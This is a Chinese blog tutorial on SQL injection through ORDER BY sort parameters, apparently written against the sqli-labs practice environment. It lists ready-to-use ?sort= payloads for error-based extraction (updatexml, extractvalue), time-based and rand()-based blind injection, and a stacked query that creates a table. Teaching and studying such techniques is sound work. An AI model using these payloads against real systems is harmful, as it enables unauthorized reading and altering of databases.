# 原创
：  【SQL注入】order by 注入：联合盲注、报错、堆叠注入

# 【SQL注入】order by 注入：联合盲注、报错、堆叠注入

**目录**

[一、推荐：](#%E4%B8%80%E3%80%81%E6%8E%A8%E8%8D%90%EF%BC%9A)

[二、简介](#%E4%BA%8C%E3%80%81%E7%AE%80%E4%BB%8B)

[概述：](#%E6%A6%82%E8%BF%B0%EF%BC%9A)

[原理：](#%E5%8E%9F%E7%90%86%EF%BC%9A)

[三、示例](#%E4%B8%89%E3%80%81%E7%A4%BA%E4%BE%8B)

[猜列数：](#%E7%8C%9C%E5%88%97%E6%95%B0%EF%BC%9A)

[联合报错注入：](#%E8%81%94%E5%90%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A)

[联合时间盲注注入：](#%E8%81%94%E5%90%88%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5%EF%BC%9A)

[联合堆叠注入：](#%E8%81%94%E5%90%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%9A)

[联合布尔盲注判断注入：](#%E8%81%94%E5%90%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%EF%BC%9A)

---


## 一、推荐：

> 
[【SQL注入-可回显】报错注入：简介、相关函数、利用方法<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793425516782184662074%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793425516782184662074&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793425516782184662074%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793425516782184662074&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450)[【SQL注入-无回显】时间盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793429016781685386411%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793429016781685386411&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793429016781685386411%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793429016781685386411&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)[【SQL注入-无回显】布尔盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793429016781685386411%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793429016781685386411&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793429016781685386411%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793429016781685386411&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)[【SQL注入】堆叠注入<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125798787?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793435916781818791855%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793435916781818791855&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125798787-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%A0%86%E5%8F%A0&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125798787?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165793435916781818791855%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165793435916781818791855&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125798787-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%A0%86%E5%8F%A0&amp;spm=1018.2226.3001.4450)


---


---


## 二、简介

> 
<h3>概述：</h3>
order by注入，注入点一般是order by子句后的参数（提供注入点）
并进行desc（逆序）/asc（正序）进行排序


> 
<h3>原理：</h3>
利用order by子句进行猜解表中的列数（修改后面的参数值），再配合union select语句进行回显
<hr/>
直接利用order by提供的注入点，通过更改order by后面的参数，在2配合其他注入方法从而实现语句的注入


---


---


## 三、示例

> 
<h3>猜列数：</h3>
order by num（数字）
通过判断回显是否正确，判断所对应的列数


> 
<h3>联合报错注入：</h3>
联合使用updatexml函数
order by
?sort=(updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1));
<hr/>
联合使用extractvalue函数
order by
?sort=1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))


> 
<h3>联合时间盲注注入：</h3>
联合使用sleep函数
order by
?sort=if((ascii(mid((select database()),1,1))=116),sleep(1),1);


> 
<h3>联合堆叠注入：</h3>
多语句注入
order by 
?sort=……;create table less50 like users


> 
<h3>联合布尔盲注判断注入：</h3>
rand()函数，如果相反结果不一致，即存在盲注
eg：rand(1)与rand(0)；rand(false)与rand(true)；rand(1=1)与rand(1=2)
通过盲注进行判断注入语句是否正确
<hr/>
order by
?sort=rand(ascii(mid((select database()),1,1))&gt;96)
如果正确则与rand(1)结果一直
反之与rand(0)一样

